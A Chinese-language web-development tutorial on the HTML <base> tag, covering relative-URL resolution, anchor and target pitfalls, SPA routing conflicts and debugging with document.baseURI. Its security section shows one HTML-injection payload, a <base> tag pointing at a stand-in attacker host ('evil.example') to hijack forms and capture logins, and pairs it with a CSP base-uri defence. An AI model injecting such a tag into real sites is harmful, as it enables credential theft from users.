> 原文链接：[一行 base 标签，让整站相对路径都偏了 - 码日新 · 每日文章](https://daily.xplanc.org/zh/html/一行-base-标签，让整站相对路径都偏了.md)

---

# 一行 base 标签，让整站相对路径都偏了

页面在本地双击打开时图片、脚本和链接都正常，部署到子目录后却集体指向了域名根目录：图片 404，脚本没加载，连站内链接都跳回了首页。把网络面板翻一遍，请求地址全是从根路径开始的。这类问题排查起来很绕，因为它不是某一处路径写错，而是整个文档解析相对 URL 的基准被改掉了，最常见的元凶就是一行 `<base>`。本文梳理它的作用范围、几个让人头疼的坑，以及怎么排查和规避。

## 它到底改了什么

`<base>` 只能放在 `<head>` 里，用来给文档中的所有相对 URL 指定一个基准。语法很简单：

```html
<head>
  <base href="https://cdn.example.com/assets/">
</head>
```

之后，页面里所有相对地址都会相对这个 `href` 解析，而不是相对当前页面的地址。于是 `<img src="logo.png">` 实际请求的是 `https://cdn.example.com/assets/logo.png`。

有两个容易被忽略的细节。第一，一个文档里可以写多个 `<base>`，但只有第一个带 `href` 的生效，后面的会被直接忽略；如果第一个 `<base>` 只有 `target` 没有 `href`，那么后面带 `href` 的那个仍然可以生效。第二，它必须出现在所有带 URL 的元素之前——浏览器解析到某个 `<img>` 时就会用当时已经确定的基准，之后再写 `<base>` 对前面的元素不起作用。

## 受影响的不只是链接

很多人以为 `<base>` 只影响 `<a href>`，其实它影响的是“所有相对 URL”。下面这些都会中招：

| 元素或场景 | 涉及的属性 | 后果 |
|---|---|---|
| 链接 | `<a href>` | 站内相对链接指向别处 |
| 图片、脚本、样式 | `src`、`href` | 资源加载路径整体偏移 |
| 表单 | `<form action>` | 表单提交到错误的地址 |
| 请求 | `fetch('api/data')` | 相对请求被改写到基准路径 |
| 锚点 | `<a href="#top">` | 跳转到基准页面的锚点 |

注意最后一行。即便是页内锚点，也会先被拼到基准 URL 后面再解析。这是 `<base>` 最反直觉的地方，单独说一下。

## 锚点为什么跳到了别的页面

假设你写了一个常见的“返回顶部”链接：

```html
<base href="https://example.com/blog/">
<a href="#top">回到顶部</a>
```

你的本意是跳到当前页面的 `#top`。但浏览器会先把 `#top` 相对基准解析成 `https://example.com/blog/#top`，于是页面直接跳到了 `blog` 目录下的那个页面，而不是你现在正在看的这篇。如果基准是另一个域名，那表现就是点一下链接直接离开了站点。

同样的逻辑也影响 JS：

```js
location.hash = '#comments';   // 这个没事，直接改当前页 hash
location.href = '#comments';   // 这个会拼上 base，跳到基准页面
```

所以排查“页内锚点莫名跳走”的问题时，先看一下有没有 `<base>`。

## target 的隐藏副作用

`<base>` 还有一个 `target` 属性，作用是给整个文档设定默认的浏览上下文：

```html
<base target="_blank">
```

从这一行往后，所有没有显式写 `target` 的链接和表单，都会在**新标签页**里打开。这通常不是你想要的：用户点个导航就多开一个标签，点提交又多开一个，而代码里翻来覆去都找不到 `target="_blank"`。更麻烦的是它和 `<base href>` 可以写在一起，排查时很容易只盯着 URL 问题，忽略了跳转方式也被改了。

想让个别链接恢复默认行为，显式写回去即可：

```html
<a href="/about" target="_self">关于我们</a>
```

## 和前端路由打架

单页应用用 `history.pushState` 改地址栏，看起来和 `<base>` 没关系，实则容易冲突。比如应用部署在子路径 `/app/`，但构建产物里的 `<base href="/">` 没改，那么组件里写的 `fetch('api/user')` 会被解析到 `https://example.com/api/user`，而后端接口其实挂在 `https://example.com/app/api/user`。结果就是本地开发正常、部署到子路径就 404。

反过来也一样：如果你的接口请求本来就该走根路径，却在 HTML 里塞了一个带子路径的 `<base>`，那所有相对请求都会被强行加上前缀。

## 怎么排查这类问题

先确认页面当前的基准到底是什么，别靠猜：

```js
console.log(document.baseURI);
// 当前文档解析相对 URL 用的真实基准

console.log(new URL('api/user', document.baseURI).href);
// 直接看某个相对地址最终会被解析成什么
```

如果 `document.baseURI` 和你预期的页面地址不一致，基本就能确定是 `<base>` 在作祟。接着在源码里搜 `<base`，确认它的位置是不是在所有资源引用之前、`href` 结尾有没有带斜杠。

这里有个高频错误：`href="https://cdn.example.com/assets"` 少了结尾斜杠，浏览器会把它当成文件而不是目录，`logo.png` 会被解析成 `https://cdn.example.com/logo.png`，资源照样 404。基准 URL 的结尾斜杠不是装饰，它决定了相对路径是拼在目录后面还是替换掉最后一段。

另外，在写可复用的组件时，尽量别依赖隐式基准，用明确的绝对路径或从配置里读前缀，能省掉很多部署环境的坑：

```js
const API = new URL('/app/api/', location.origin).href;
```

## 别忽略安全层面

`<base>` 不只是“好不好用”的问题，它还能被当成攻击手段。假设页面某个地方存在 HTML 注入，攻击者插入了这一行：

```html
<base href="https://evil.example/">
```

如果脚本标签被过滤掉、但 HTML 标签没被过滤，那么页面里所有相对链接和表单的 `action` 都会悄悄指向 `evil.example`。用户点“登录”，账号密码就提交到了攻击者的服务器，而页面看起来毫无异常。这就是常说的 base 标签劫持。

防御手段是给响应加 CSP，限制基准来源：

```
Content-Security-Policy: base-uri 'self'
```

如果页面压根不需要 `<base>`，直接用 `base-uri 'none'` 更彻底。这样即使攻击者注入了标签，浏览器也不会采纳它。

## 什么时候该用，什么时候别用

`<base>` 并不是洪水猛兽，它在一些场景下确实好用：静态站点整站托管在 CDN、需要统一给所有相对资源加前缀、单页应用想固定路由基准。这些情况下，一个 `<base>` 能替掉无数处手工拼接。

但如果你只是想解决某张图片加载不出来，就不要动 `<base>`——它改的是全局基准，牵一发而动全身。相对路径的问题，优先检查路径本身、结尾斜杠和部署前缀。记住一句话：`<base>` 是文档级的“坐标系”，改它之前先想清楚，整个页面里的每一个相对地址都会跟着一起挪。

## 相关文章

- [改了 setAttribute，页面为什么没反应](https://daily.xplanc.org/zh/html/改了-setAttribute，页面为什么没反应.md)
- [写了 srcset，浏览器为什么还是下载了最大那张图](https://daily.xplanc.org/zh/html/写了-srcset，浏览器为什么还是下载了最大那张图.md)
- [被低估的 details：折叠面板根本不用写 JS](https://daily.xplanc.org/zh/html/被低估的-details：折叠面板根本不用写-JS.md)
- [preload 写了，字体为什么还是下载两遍](https://daily.xplanc.org/zh/html/preload-写了，字体为什么还是下载两遍.md)
- [别急着写 JS：用原生 HTML 完成表单校验](https://daily.xplanc.org/zh/html/别急着写-JS：用原生-HTML-完成表单校验.md)

> 本文由 AI 辅助生成并经人工校验，如有疏漏欢迎指正。
